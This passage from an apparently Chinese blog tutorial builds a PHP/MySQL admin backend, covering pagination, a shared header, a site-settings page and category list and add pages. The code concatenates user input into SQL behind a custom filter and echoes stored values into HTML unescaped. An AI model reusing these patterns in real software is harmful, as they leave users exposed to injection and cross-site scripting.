operator">-&gt;</span><span class="token property">showPages</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">//左边加显示页数减1就是右边显示数</span>        <span class="token variable">$right</span><span class="token operator">=</span><span class="token function">min</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token punctuation">,</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">countPages</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//右边最大不能大于总页数</span>        <span class="token variable">$left</span><span class="token operator">=</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token variable">$right</span><span class="token operator">-</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">showPages</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//确定右边再计算左边，必须二次计算</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token variable">$left</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;=</span> <span class="token variable">$right</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'page'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$i</span><span class="token punctuation">;</span>            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">page_arr</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">href</span><span class="token operator">.</span><span class="token string single-quoted-string">'?'</span><span class="token operator">.</span><span class="token function">http_build_query</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后再article_list中进行调用调整即可</p><h2 id="公共模块的建立和引入"><a href="#公共模块的建立和引入" class="headerlink" title="公共模块的建立和引入"></a>公共模块的建立和引入</h2><p>由于之前的代码article_add，article_list，article_edit存在共有部分 所以我们将之放到一个header里调用他们，在header中调用init.php</p><p>header.php//到此还有一些跳转没有写</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include_once</span> <span class="token string single-quoted-string">'init.php'</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span class="token doctype"><span class="token punctuation">&lt;!</span><span class="token doctype-tag">doctype</span> <span class="token name">html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">&gt;</span></span>后台管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/common.css<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>css/main.css<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>topbar-wrap white<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>topbar-inner clearfix<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>topbar-logo-wrap clearfix<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>topbar-logo none<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-brand<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>后台管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>navbar-list clearfix<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>on<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>index.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>网站首页<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top-info-wrap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>top-info-list clearfix<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>管理员<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>修改密码<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>退出<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>container clearfix<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sidebar-wrap<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sidebar-title<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>菜单<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sidebar-content<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sidebar-list<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-font<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="">&amp;#xe003;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span>常用操作<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sub-menu<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>article_list.php<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-font<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="">&amp;#xe005;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span>文章管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>design.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-font<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="">&amp;#xe006;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span>分类管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>design.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-font<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="">&amp;#xe052;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span>友情链接<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>#<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-font<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="">&amp;#xe018;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span>系统管理<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ul</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>sub-menu<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span>                        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>li</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>system.html<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>icon-font<span class="token punctuation">"</span></span><span class="token punctuation">&gt;</span></span><span class="token entity" title="">&amp;#xe017;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">&gt;</span></span>系统设置<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>                    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>                <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>li</span><span class="token punctuation">&gt;</span></span>            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ul</span><span class="token punctuation">&gt;</span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="系统模块信息的修改"><a href="#系统模块信息的修改" class="headerlink" title="系统模块信息的修改"></a>系统模块信息的修改</h2><p>system.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';$result = $conn-&gt;query("select * from config ");while($row=$result-&gt;fetch_assoc()){    $web[$row['name']]=$row['value'];//通过一个循环把键值赋给一个数组}if($_POST['sub']){    unset($_POST['sub']);    foreach ($_POST as $name=&gt;$value){        $value=filterstr($value);        $name=filterstr($name);        $conn-&gt;query("update config set value='$value' where name='$name'");        if($conn-&gt;error){            echo "error".$conn-&gt;error;        }    }    redirect('2','system.php','修改成功');}?&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="index.html"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span class="crumb-name"&gt;系统设置&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;form action="" method="post" id="myform" name="myform"&gt;                &lt;div class="config-items"&gt;                    &lt;div class="config-title"&gt;                        &lt;h1&gt;&lt;i class="icon-font"&gt;&amp;#xe00a;&lt;/i&gt;网站信息设置&lt;/h1&gt;                    &lt;/div&gt;                    &lt;div class="result-content"&gt;                        &lt;table width="100%" class="insert-tab"&gt;                            &lt;tbody&gt;&lt;tr&gt;                                &lt;th width="15%"&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;域名：&lt;/th&gt;                                &lt;td&gt;&lt;input type="text" id="" value="&lt;?php echo $web['website_url'];?&gt;" size="85" name="website_url" class="common-text"&gt;&lt;/td&gt;                            &lt;/tr&gt;                            &lt;tr&gt;                                &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;站点标题：&lt;/th&gt;                                &lt;td&gt;&lt;input type="text" id="" value="&lt;?php echo $web['website_title'];?&gt;" size="85" name="website_title" class="common-text"&gt;&lt;/td&gt;                            &lt;/tr&gt;                            &lt;tr&gt;                                &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;关键字：&lt;/th&gt;                                &lt;td&gt;&lt;input type="text" id="" value="&lt;?php echo $web['website_keywords'];?&gt;" size="85" name="website_keywords" class="common-text"&gt;&lt;/td&gt;                            &lt;/tr&gt;                            &lt;tr&gt;                                &lt;th&gt;&lt;i class="require-red"&gt;*&lt;/i&gt;描述：&lt;/th&gt;                                &lt;td&gt;&lt;input type="text" id="" value="&lt;?php echo $web['website_desc'];?&gt;" size="85" name="website_desc" class="common-text"&gt;&lt;/td&gt;                            &lt;/tr&gt;                            &lt;tr&gt;                                &lt;th&gt;&lt;/th&gt;                                &lt;td&gt;                                    &lt;input type="submit" value="提交" name="sub" class="btn btn-primary btn6 mr10"&gt;                                    &lt;input type="button" value="返回" onClick="history.go(-1)" class="btn btn6"&gt;                                &lt;/td&gt;                            &lt;/tr&gt;                            &lt;/tbody&gt;&lt;/table&gt;                    &lt;/div&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们把输入的值用filterstr函数做了过滤，所以提交特殊符号会被转义</p><p><img src="/2021/07/13/60-zhi-day9/image-20210714183335436.png" alt="image-20210714183335436"></p><h2 id="栏目模块的编写"><a href="#栏目模块的编写" class="headerlink" title="栏目模块的编写"></a>栏目模块的编写</h2><p>栏目模块类似于文章模块</p><p>有cate_list cate_edit cate_add三个部分</p><p>我们直接拿来稍作修改即可，顺便把header里面的跳转修改</p><p>cate_list.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';if($_GET['action']=='del'){    $id=filterstr($_GET['id']);    $conn-&gt;query("delete from cate where id='$id'");    if($conn-&gt;affected_rows&gt;0){        redirect('2','cate_list.php','删除成功');    }else{        redirect('2','cate_list.php','删除失败');    }}?&gt;    &lt;!--/sidebar--&gt;    &lt;div class="main-wrap"&gt;        &lt;div class="crumb-wrap"&gt;            &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a href="index.html"&gt;首页&lt;/a&gt;&lt;span class="crumb-step"&gt;&gt;&lt;/span&gt;&lt;span class="crumb-name"&gt;分类管理&lt;/span&gt;&lt;/div&gt;        &lt;/div&gt;        &lt;div class="result-wrap"&gt;            &lt;form name="myform" id="myform" method="post"&gt;                &lt;div class="result-title"&gt;                    &lt;div class="result-list"&gt;                        &lt;a href="cate_add.php"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;新增栏目&lt;/a&gt;                    &lt;/div&gt;                &lt;/div&gt;                &lt;div class="result-content"&gt;                    &lt;table class="result-tab" width="100%"&gt;                        &lt;tr&gt;                            &lt;th&gt;ID&lt;/th&gt;                            &lt;th&gt;栏目名称&lt;/th&gt;                            &lt;th&gt;操作&lt;/th&gt;                        &lt;/tr&gt;                        &lt;tr&gt;                        &lt;?php                        $result = $conn-&gt;query("select * from cate");                        $result_count = $result-&gt;num_rows;                        while ($row=$result-&gt;fetch_assoc()){                        ?&gt;                            &lt;td&gt;&lt;?php echo $row['id']?&gt;&lt;/td&gt;                            &lt;td title="&lt;?php echo $row['class_name']?&gt;"&gt;&lt;a target="_blank"  href="cate_edit.php?id=&lt;?php echo $row['id'];?&gt;"title="&lt;?php echo $row['class_name']?&gt;"&gt;&lt;?php echo $row['class_name']?&gt;&lt;/a&gt;                            &lt;/td&gt;                            &lt;td&gt;                                &lt;a class="link-update" href="cate_edit.php?id=&lt;?php echo $row['id'];?&gt;"&gt;修改&lt;/a&gt;                                &lt;a class="link-del" href="javascript:del(&lt;?php echo $row['id'];?&gt;);"&gt;删除&lt;/a&gt;                            &lt;/td&gt;                        &lt;/tr&gt;                        &lt;?php                        }                        ?&gt;                    &lt;/table&gt;                &lt;/div&gt;            &lt;/form&gt;        &lt;/div&gt;    &lt;/div&gt;    &lt;!--/main--&gt;&lt;/div&gt;&lt;script&gt;    function del(id){        if(false==confirm("是否确定删除此篇文章？")) return;        location.href='?action=del&amp;id='+id;    }&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>cate_add.php</p><pre class="line-numbers language-php+HTML" data-language="php+HTML"><code class="language-php+HTML">&lt;?phpinclude_once 'header.php';if($_POST['sub']){    $title = filterstr($_POST['title']);    $conn-&gt;query("insert into cate (class_name) value ('$title')");    if($conn-&gt;affected_rows&gt;0){        redirect('2','cate_list.php','添加栏目成功');    }else{        redirect('2','cate_list.php','添加栏目失败');    }}?&gt;&lt;!--/sidebar--&gt;&lt;div class="main-wrap"&gt;    &lt;div class="crumb-wrap"&gt;        &lt;div class="crumb-list"&gt;&lt;i class="icon-font"&gt;&lt;/i&gt;&lt;a 